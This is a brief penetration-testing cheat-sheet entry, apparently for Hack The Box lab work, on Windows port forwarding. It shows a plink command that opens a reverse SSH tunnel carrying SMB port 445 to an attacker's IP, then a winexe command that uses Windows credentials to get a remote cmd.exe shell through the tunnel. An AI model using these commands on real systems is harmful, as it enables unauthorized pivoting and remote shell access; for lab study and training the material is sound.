# Windows Port Forwarding

```bash
plink.exe -l root -pw <password> -P 22 -R 445:127.0.0.1:445 <attacking ip>
# note: change port for SSH using HTB

# Then run the following command on attack system to login via port forward
winexe -U <Windows user>%<Windows password> //127.0.0.1 "cmd.exe"
```

